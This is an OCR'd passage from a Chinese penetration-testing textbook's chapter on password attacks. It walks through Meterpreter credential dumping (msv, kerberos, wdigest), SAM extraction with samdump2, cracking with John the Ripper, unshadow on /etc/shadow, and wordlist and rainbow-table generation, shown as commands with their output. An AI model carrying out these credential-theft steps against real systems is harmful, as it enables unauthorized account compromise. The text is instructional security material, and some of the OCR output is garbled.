【实例8-4】恢复哈希密码。执行命令如下所示：
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
AuthID
Package
Domain
User
Password
0;287555 NTLM
WIN-RKPKQFBLG6C
bob
Im{cd4f4cd1ca451e41aad3b435b51404ee}, ntlm{ 3ed1ce151e74d17cee66bf
6c3eed4625}
0:287509 NTLM
WIN-RKPKQFBLG6C
bob
Imcd4f4cd1ca451e41aad3b435b51404ee).ntlm(3ed1ce151e74d17cee66b
f6c3eed4625}
0;996
Negotiate
WORKGROUP
-RKPKQFBLG6CS
n.s.(Credentials KO)
0;997
Negotiate
NT AUTHORITY
LOCAL SERVICE
n.s.(Credentials KO)
0;45372
NTLM
n.s. (Credentials KO)
0;999
NTLM
WORKGROUP
WIN-RKPKQFBLG6C$ n.s.(Credentials KO)
执行以上命令后，输出五列信息。分别表示认证ID、包、域名、用户名和密码。从该
界面可以看到，当前系统中bob用户的哈希密码值中。在哈希密码值中，前面的lm表示
使用LM方式加密：ntlm表示使用NTLM方式加密。
【实例8-5】获取kerberos（网络认证协议）信息。执行命令如下所示：
meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
AuthID
Package
Domain
User
Password
0;999
NTLM
WORKGROUP
WIN-RKPKQFBLG6CS
0;45372
NTLM
0;997
Negotiate
NT AUTHORITY
LOCALSERVICE
0;996
Negotiate
WORKGROUP
WIN-RKPKQFBLG6CS
· 257 ·
---
## Page 270
第3篇各种渗透测试
0:287509 NTLM
WIN-RKPKQFBLG6C
bob
www.123
0;287555NTLM
WIN-RKPKQFBLG6C
bob
www.123
从输出的信息中可以看到，输出的信息类似msV命令输出的信息。唯一不同的就是，
这里可以看到使用哈希加密的原始密码。从以上信息中，可以看到bob用户的密码为
www.123。
【实例8-6】获取wdigest（摘要式身份验证）信息，如下所示：
meterpreter > wdigest
[+] Running as SYSTEM
[] Retrieving wdigest credentials
wdigest credentials
Package
AuthID
Domain
User
Password
0:999
NTLM
WORKGROUP
WIN-RKPKQFBLG6C$
0;45372
NTLM
0;997
Negotiate
NT AUTHORITY
LOCAL SERVICE
0;996
Negotiate
WORKGROUP
WIN-RKPKQFBLG6C$
0;287509
NTLM
WIN-RKPKQFBLG6C
bob
www.123
0;287555
NTLM
WIN-RKPKQFBLG6C
bob
www.123
以上输出的信息就是当前用户摘要式身份验证的信息。
【实例8-7】恢复livessp身份验证信息。执行命令如下所示：
meterpreter > livessp
[+] Running as SYSTEM
[*] Retrieving livessp credentials
livessp credentials
AuthID
Package
Domain
User
Password
0;287555
NTLM
WIN-RKPKQFBLG6C
bob
n.a. (livessp KO)
0:287509
NTLM
WIN-RKPKQFBLG6C
bob
n.a. (livessp KO)
0;997
Negotiate
NT AUTHORITY
LOCAL SERVICE
n.a. (livessp KO)
0;996
Negotiate
WORKGROUP
WIN-RKPKQFBLG6C$
n.a. (livessp KO)
0;45372
NTLM
n.a. (livessp KO)
0;999
NTLM
WORKGROUP
WIN-RKPKQFBLG6C$
n.a. (livessp KO)
meterpreter >
以上输出的信息显示了当前用户livessp身份验证信息。
8.6
破解操作系统用户密码
当忘记操作系统的密码或者攻击某台主机时，需要知道该系统中某个用户的用户名和
密码。本节将分别介绍破解Windows和Linux用户密码。
8.6.1破解Windows用户密码
Windows系统的用户名和密码保存在SAM（安全账号管理器）文件中。在基于NT内
核的Windows系统中，包括Windows2000及后续版本，这个文件保存在“C：Windows
· 258 ·
---
## Page 271
第8章密码攻击
System32\Config”目录下。出于安全原因，微软特定添加了一些额外的安全措施将该文件
保护了起来。首先，操作系统启动之后，SAM文件将同时被锁定。这意味着操作系统运行
之时，用户无法打开或复制SAM文件。除了锁定，整个SAM文件还经过加密，且不可见。
幸运的是，现在有办法绕过这些限制。在远程计算机上，只要目标处于运行状态，就
可以利用Meterpreter和SAMJuicer获取计算机上的散列文件。获得访问系统的物理权限
之后，用户就可以在其上启动其他的操作系统，如在USB或DVD-ROM设备上的Kali
Linux。启动目标计算机进入到其他的操作系统之后，用户可以使用Kali中的JohntheRipper
工具来破解该Windows用户密码。
使用John theRipper工具破解Windows用户密码。具体操作步骤如下所示。
（1）检查当前系统中的硬盘驱动。执行命令如下所示：
root@kali:~# fdisk -1
Disk /dev/sda: 42.9 GB, 42949672960 bytes
255 heads,63 sectors/track,5221 cylinders, total 83886080 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0xcfc6cfc6
Device Boot
Start
End
Blocks
IdSystem
/dev/sda1*638385929941929618+7HPFS/NTFS/exFAT
输出的信息表示当前系统中有一块磁盘，并只有一个分区。该文件系统类型是NTFS，
也是Windows系统的所存放的磁盘。
七
（2）挂载硬盘驱动。执行命令如下所示：
root@kali:~# mkdir /sda1
#创建挂载点
root@kali:~# mount /dev/sda1/sda1/
#挂载/dev/sda1分区
执行以上命令后，没有任何输出信息。
（3）切换目录，进入到WindowsSAM文件的位置。执行命令如下所示：
root@kali:~#cd /sda1/WINDOWS/system32/config/
在该目录中，可以看到SAM文件。
（4）使用SamDump2提取SAM文件。执行命令如下所示：
root@kali:/sda1/WVINDOWS/system32/config# samdump2 SAM system > /root/hash.txt
samdump2 1.1.1 by Objectif Securite
http://www.objectif-securite.ch
original author: ncuomo@ studenti.unina.it
Root Key:SAM
从输出信息中可以看到提取了SAM文件。将该文件的内容重定向到了/root/hash.txt文
件中。
（5）运行john命令，实现密码攻击。执行命令如下所示：
root@kali/sda1/WINDOWS/system32/config#/usr/sbin/john /root/hash.txt --format=nt
Created directory:/root.john
Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
(Guest)
guesses:4 time:0:00:03:13 0.09% (3) (ETA:Mon May 12 06:46:42 2014)c/s:152605K
trying: 2KRIN.P - 2KRIDY8
· 259 ·
---
## Page 272
第3篇各种渗透测试
guesses:4time:0:00:04:26 0.13% (3) (ETA:Mon May 12 04:02:53 2014)c/s:152912K
trying: GROKUHI- GROKDN1
guesses:4time: 0:00:04:27 0.13% (3) (ETA:Mon May 12 04:15:42 2014)c/s:152924K
trying:HKCUUHT-HKCUGDS
8.6.2破解Linux用户密码
破解Linux的密码基本上和破解Windows密码的方法非常类似，在该过程中只有一点
不同。Linux系统没有使用SAM文件夹来保存密码散列。Linux系统将加密的密码散列包
含在一个叫做shadow的文件里，该文件的绝对路径为/etc/shadow。
不过，在使用John theRipper破解/etc/shadow文件之前，还需要/etc/passwd文件。这
和提取Windows密码散列需要system文件和SAM文件是一样的道理。JohntheRipper自
带了一个功能，它可以将shadow和passwd文件结合在一起，这样就可以使用该工具破解
Linux系统的用户密码。本小节将介绍破解Linux用户密码的方法。
使用John theRipper工具破解Linux用户密码。具体操作步骤如下所示。
（1）使用unshadow提取密码散列。执行命令如下所示：
root@kali:~# unshadow/etc/passwd/etc/shadow >/tmp/linux_hashes.txt
执行以上命令后，会将/etc/passwd/文件与/etc/shadow/文件结合在一起，生成一个叫做
linuxhashes.txt的文件，保存在/tmp/目录中。
（2）破解Linux用户密码。执行命令如下所示：
root@kali:~# john --format=crypt --show /tmp/linux_hashes.txt
root:123456:0:0:root:/root:/bin/bash
bob:123456:1000:1001:/home/bob:/bin/sh
alice:123456:1001:1002:/home/alice:/bin/sh
3password hashes cracked, 0 left
从输出的结果中，可以看到当前系统中共有三个用户，其密码都为123456。
注意：使用John the Ripper开始破解Linux密码之前，需要使用支持破解不同类型密码
散列的John theRipper版本。如果用错版本或者使用未打补丁的John theRipper，
程序将返回错误信息No passwordhashes loaded（没有价值密码散列）。大多数
现代Linux系统都使用SHA散列加密算法保存密码。
8.7创建密码字典
所谓的密码字典主要是配合密码破解软件所使用，密码字典里包括许多人们习惯性设
置的密码。这样可以提高密码破解软件的密码破解成功率和命中率，缩短密码破解的时间。
当然，如果一个人密码设置没有规律或很复杂，未包含在密码字典里，这个字典就没有用
了，甚至会延长密码破解所需要的时间。在Linux中有Crunch和rtgen两个工具，可以来
创建密码字典。为方便用户的使用，本节将介绍这两个工具的使用方法。
260·
---
## Page 273
第8章密码攻击
8.7.1Crunch工具
Crunch是一种创建密码字典工具，该字典通常用于暴力破解。使用Crunch工具生成
的密码可以发送到终端、文件或另一个程序。下面将介绍使用Crunch工具创建密码字典。
使用Crunch生成字典。具体操作步骤如下所示。
（1）启动crunch命令。执行命令如下所示。
root@kali:~#crunch
执行以上命令后，将输出如下所示的信息：
crunch version 3.4
Crunch can create a wordlist based on criteria you specify.The outout from crunch can be sent
to the screen, file, or to another program.
Usage: crunch   [options]
where min and max are numbers
Please refer to the man page for instructions and examples on how to use crunch.
输出的信息显示了crunch命令的版本及语法格式。其中，使用crunch命令生成密码的
语法格式如下所示：
crunch [minimum length] [maximum length] [character set] [options]
crunch命令常用的选项如下所示。
口-0：用于指定输出字典文件的位置。
口-b：指定写入文件最大的字节数。该大小可以指定KBMB或GB，但是必须与-0
START选项一起使用。
口-t：设置使用的特殊格式。
口-1：该选项用于当-t选项指定@、%或时，用来识别占位符的一些字符。
（2）创建一个密码列表文件，并保存在桌面上。其中，生成密码列表的最小长度为8，
最大长度为10，并使用ABCDEFGabcdefg0123456789为字符集。执行命令如下所示：
root@kali:~# crunch 8 10ABCDEFGabcdefg0123456789 -o /root/Desktop/
generatedCrunch.txt
Notice: Detected unicode characters.If you are piping crunch output
to another program such as john or aircrack please make sure that program
can handle unicode input.
Do you want to continue? [Y/n] y
Crunch will now generate the following amount of data: 724845943848960 bytes
691266960 MB
675065 GB
659 TB
0 PB
Crunch will now generate the following number of lines:66155263819776
AAAAAAAA
AAAAAAAB
AAAAAAAC
AAAAAAAD
AAAAAAAE
AAAAAAAF
AAAAAAAG
AAAAAAAa
197·
---
## Page 274
第3篇各种渗透测试
AAAAAAAb
AAAAAAAC
AAdb6gFe
AAdb6gFf
AAdb6gFg
AAdb6gF0
AAdb6gF1
AAdb6gF2
AAdb6gF3
AAdb6gF4
AAdb6gF5
从以上输出的信息中，可以看到将生成659TB大的文件，总共有66155263819776行。
以上命令执行完成后，将在桌面上生成一个名为generatedCrunch.txt的字典文件。由于组
合生成的密码较多，所以需要很长的时间。
（3）以上密码字典文件生成后，使用Nano命令打开。执行命令如下所示：
root@kali:~# nano /root/Desktop/generatedCrunch.txt
执行以上命令后，将会打开generatedCrunch.txt文件。该文件中保存了使用crunch命
令生成的所有密码。
8.7.2rtgen工具
rtgen工具用来生成彩虹表。彩虹表是一个庞大的和针对各种可能的字母组合预先计算
好的哈希值的集合。彩虹表不一定是针对MD5算法的，各种算法都有，有了它可以快速
的破解各类密码。越是复杂的密码，需要的彩虹表就越大，现在主流的彩虹表都是100G
以上。
使用rtgen工具生成彩虹表。具体操作步骤如下所示：
（1）切换到rtgen目录。执行命令如下所示。
root@kali:~#cd/usr/share/rainbowcrack/
（2）使用rtgen命令生成一个基于MD5的彩虹表。执行命令如下所示：
root@kali:/usr/share/rainbowcrack# ./rtgen md5 loweralpha-numeric 1 5 0 3800 33554432 0
rainbow table md5_loweralpha-numeric#1-5_0_3800x33554432_0.rt parameters
hash algorithm:
md5
hash length:
16
charset:
abcdefghijklmnopqrstuvwxyz0123456789
charset in hex:
61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72
charset length:
36
plaintext length range: 1 - 5
reduce offset:
00000000X0
plaintext total:
62193780
sequential starting point begin from 0 (0x0000000000000000)
generating...
131072 of 33554432 rainbow chains generated (0 m 42.5 s)
262144 of 33554432 rainbow chains generated (0 m 39.2 s)
393216 of 33554432rainbow chains generated (0 m 41.6 s)
524288 of 33554432 rainbow chains generated (0 m 42.0 s)
655360 of 33554432 rainbow chains generated (0 m 39.1 s)
·262 ·
---
## Page 275
第8章密码攻击
786432 of 33554432 rainbow chains generated (0 m 40.1 s)
917504 of 33554432 rainbow chains generated (0 m 39.9 s)
1048576 of 33554432 rainbow chains generated (0 m 38.8 s)
1179648 of 33554432 rainbow chains generated (0 m 39.2 s)
1310720 of 33554432 rainbow chains generated (0 m 38.2 s)
33161216 of 33554432 rainbow chains generated (0 m 40.2 s)